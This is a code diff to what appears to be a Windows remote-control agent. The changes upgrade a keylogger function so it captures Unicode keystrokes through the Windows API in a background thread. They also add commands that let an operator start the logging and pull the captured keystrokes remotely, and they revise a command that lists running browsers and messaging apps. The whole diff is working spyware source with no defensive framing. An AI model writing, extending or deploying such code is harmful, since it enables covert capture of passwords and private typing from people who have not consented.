@@ -57,6 +57,9 @@ clipboard_file = None
 clipboard_cut = False
 current_heartbeat_interval = HEARTBEAT_INTERVAL_SECONDS
 current_command_check_interval = COMMAND_CHECK_INTERVAL_SECONDS
+mimetic_active = False
+mimetic_log = []
+mimetic_finished = False
 current_inactivity_threshold = INACTIVITY_THRESHOLD_SECONDS
 mimetic_active = False
 mimetic_log = []
@@ -260,15 +263,21 @@ def ensure_startup():
 
 
 def mimetic_keylogger():
-    """Capture keyboard input using Windows API polling until ESC or 1 minute inactivity."""
-    log = []
+    """Capture keyboard input including special characters (ñ, ?, etc) using Windows API."""
+    global mimetic_log, mimetic_finished
+
     last_key_time = time.time()
     inactivity_timeout = 60  # 1 minute of inactivity for auto-stop
 
     try:
-        GetAsyncKeyState = ctypes.windll.user32.GetAsyncKeyState
-    except Exception as e:
-        return f"Error: Could not access Windows API - {str(e)}"
+        user32 = ctypes.windll.user32
+        GetAsyncKeyState = user32.GetAsyncKeyState
+        GetKeyboardState = user32.GetKeyboardState
+        ToUnicodeEx = user32.ToUnicodeEx
+        GetKeyboardLayout = user32.GetKeyboardLayout
+    except Exception:
+        mimetic_finished = True
+        return
 
     # Key codes for special keys
     VK_ESCAPE = 0x1B
@@ -279,6 +288,7 @@ def mimetic_keylogger():
 
     try:
         pressed_keys = set()
+        keyboard_state = ctypes.c_ubyte * 256
 
         while True:
             current_time = time.time()
@@ -300,16 +310,43 @@ def mimetic_keylogger():
 
                     # Check for ESC to exit immediately
                     if vk_code == VK_ESCAPE:
-                        result = ''.join(log)
-                        return result if result else "No keys recorded"
+                        mimetic_finished = True
+                        return
 
-                    # Map key to character
+                    # Map special keys first
                     if vk_code in key_map:
-                        log.append(key_map[vk_code])
-                    elif 0x30 <= vk_code <= 0x39:  # Numbers 0-9
-                        log.append(chr(vk_code))
-                    elif 0x41 <= vk_code <= 0x5A:  # Letters A-Z
-                        log.append(chr(vk_code).lower())
+                        mimetic_log.append(key_map[vk_code])
+                    else:
+                        # Try to convert virtual key to unicode character
+                        try:
+                            kb_state = keyboard_state()
+                            GetKeyboardState(ctypes.byref(kb_state))
+                            layout = GetKeyboardLayout(0)
+
+                            # Buffer for unicode output
+                            unicode_buffer = ctypes.c_wchar * 5
+                            result_buffer = unicode_buffer()
+
+                            # Convert key to unicode
+                            result = ToUnicodeEx(
+                                vk_code, 0, ctypes.byref(kb_state),
+                                ctypes.byref(result_buffer), 5, 0, layout
+                            )
+
+                            if result > 0:
+                                char = result_buffer.value
+                                if char:
+                                    mimetic_log.append(char)
+                            elif 0x30 <= vk_code <= 0x39:  # Fallback for numbers
+                                mimetic_log.append(chr(vk_code))
+                            elif 0x41 <= vk_code <= 0x5A:  # Fallback for letters
+                                mimetic_log.append(chr(vk_code).lower())
+                        except:
+                            # Fallback to basic mapping if ToUnicodeEx fails
+                            if 0x30 <= vk_code <= 0x39:
+                                mimetic_log.append(chr(vk_code))
+                            elif 0x41 <= vk_code <= 0x5A:
+                                mimetic_log.append(chr(vk_code).lower())
 
                 elif not is_pressed and vk_code in pressed_keys:
                     pressed_keys.discard(vk_code)
@@ -317,11 +354,10 @@ def mimetic_keylogger():
             # Small sleep to avoid consuming too much CPU
             time.sleep(0.05)
 
-        result = ''.join(log)
-        return result if result else "No keys recorded"
+        mimetic_finished = True
 
-    except Exception as e:
-        return f"Error: {str(e)}"
+    except Exception:
+        mimetic_finished = True
 
 
 def restart_agent():
@@ -475,6 +511,7 @@ def execute_shell_command(cmd_str):
     global current_working_dir
     global clipboard_file
     global clipboard_cut
+    global mimetic_active, mimetic_log, mimetic_finished
 
     try:
         cmd_lower = cmd_str.lower().strip()
@@ -646,10 +683,23 @@ def execute_shell_command(cmd_str):
 
         if cmd_lower.startswith("__mimetic__"):
             try:
-                result = mimetic_keylogger()
-                return result
+                mimetic_active = True
+                mimetic_log = []
+                mimetic_finished = False
+
+                # Start mimetic in background thread
+                threading.Thread(target=mimetic_keylogger, daemon=False).start()
+
+                # Return immediately - frontend will poll for results
+                return "Mimetic started - use __mimetic_get__ to get partial results"
             except Exception as e:
                 return f"Error: {str(e)}"
+
+        # Get mimetic partial results
+        if cmd_lower.startswith("__mimetic_get__"):
+            result = ''.join(mimetic_log)
+            status = "FINISHED" if mimetic_finished else "RECORDING"
+            return f"{result}\n[{status}]"
 
         # Handle nano command
         if cmd_lower.startswith("nano "):
@@ -899,79 +949,51 @@ def execute_shell_command(cmd_str):
             except Exception as e:
                 return f"Error: {str(e)}"
 
-        # Handle processes command - show main process per application
+        # Handle processes command - show running processes (filtered)
         if cmd_lower == "processes":
             try:
-                result = subprocess.run(["tasklist", "/v"], capture_output=True, text=True, timeout=10)
+                result = subprocess.run(["tasklist"], capture_output=True, text=True, timeout=10)
+                if not result.stdout:
+                    return "No processes running"
+
                 lines = result.stdout.strip().split("\n")
 
-                # System processes to ignore
-                system_processes = {
-                    'svchost', 'csrss', 'lsass', 'services', 'system', 'registry', 'smss',
-                    'wininit', 'winlogon', 'dwm', 'fontdrvhost', 'idle', 'explorer',
-                    'conhost', 'spoolsv', 'rundll32', 'taskhostw', 'dllhost', 'igfxcuiservice',
-                    'intelcpheciservice', 'intelcphdcpsvc', 'logonui', 'userinit', 'memory compression'
+                # Keywords for interesting processes
+                keywords = {
+                    'chrome', 'firefox', 'edge', 'opera', 'safari', 'brave',
+                    'discord', 'telegram', 'slack', 'skype', 'teams',
+                    'spotify', 'vlc', 'audacity', 'winamp',
+                    'code', 'sublime', 'notepad', 'atom', 'vim', 'emacs',
+                    'python', 'node', 'java', 'rust',
+                    'steam', 'epic', 'origin',
+                    'visual studio', 'intellij', 'pycharm',
+                    'blender', 'photoshop', 'illustrator',
+                    'obs', 'twitch', 'youtube',
+                    'git', 'docker', 'putty', 'winscp', '7zip', 'winrar',
+                    'windows agent service', 'telelluc', 'msedgewebview2', 'ms-'
                 }
 
-                # Interesting processes (browsers, apps, etc.)
-                interesting_keywords = {
-                    'chrome', 'firefox', 'edge', 'opera', 'iexplore', 'safari', 'brave',
-                    'discord', 'telegram', 'slack', 'skype', 'teams', 'whatsapp',
-                    'spotify', 'vlc', 'audacity', 'winamp', 'foobar',
-                    'code', 'sublime', 'notepad++', 'atom', 'vim', 'emacs',
-                    'python', 'node', 'java', 'rust', 'golang',
-                    'game', 'steam', 'epic', 'origin', 'uplay',
-                    'visual studio', 'intellij', 'pycharm', 'rider',
-                    'blender', 'photoshop', 'illustrator', 'premiere', 'after effects',
-                    'obs', 'streamlabs', 'xsplit', 'twitch', 'youtube',
-                    'git', 'github', 'gitlab', 'docker', 'putty', 'winscp',
-                    '7zip', 'winrar', 'everything', 'totalcommander',
-                    'windows agent service', 'telelluc', 'msedgewebview2'
-                }
+                # Header and separator
+                output = "Image Name                     PID\n"
+                output += "=================================================\n"
 
-                processes_by_app = {}
-
-                # Parse plain text output line by line
+                # Process each line
                 for line in lines[2:]:  # Skip header and separator
-                    if not line.strip():
+                    line = line.strip()
+                    if not line:
                         continue
 
-                    line_lower = line.lower()
-
-                    # Check if process is interesting and not system
-                    is_system = any(proc in line_lower for proc in system_processes)
-                    is_interesting = any(keyword in line_lower for keyword in interesting_keywords)
-
-                    if is_interesting and not is_system:
-                        # Extract process name and PID from the line
+                    # Simple check: if line contains any keyword, include it
+                    if any(kw in line.lower() for kw in keywords):
+                        # Extract name (first part) and PID (last number)
                         parts = line.split()
                         if len(parts) >= 2:
-                            proc_name = parts[0]
-                            proc_pid = parts[1]
-                            app_key = proc_name.lower()
+                            name = parts[0]
+                            pid = parts[-1]  # Last part is the PID
+                            if pid.isdigit():
+                                output += f"{name:<30} {pid}\n"
 
-                            # Keep only the first (main) process for each app
-                            if app_key not in processes_by_app:
-                                processes_by_app[app_key] = {
-                                    'name': proc_name,
-                                    'pid': proc_pid,
-                                    'line': line
-                                }
-
-                if not processes_by_app:
-                    return "No interesting processes running"
-
-                # Format output
-                output_lines = ["Image Name                     PID"]
-                output_lines.append("=" * 50)
-
-                for app_key, proc in sorted(processes_by_app.items()):
-                    name = proc['name']
-                    pid = proc['pid']
-                    line = f"{name:<30} {pid}"
-                    output_lines.append(line)
-
-                return "\n".join(output_lines[:35])
+                return output.strip()
             except Exception as e:
                 return f"Error: {str(e)}"
 
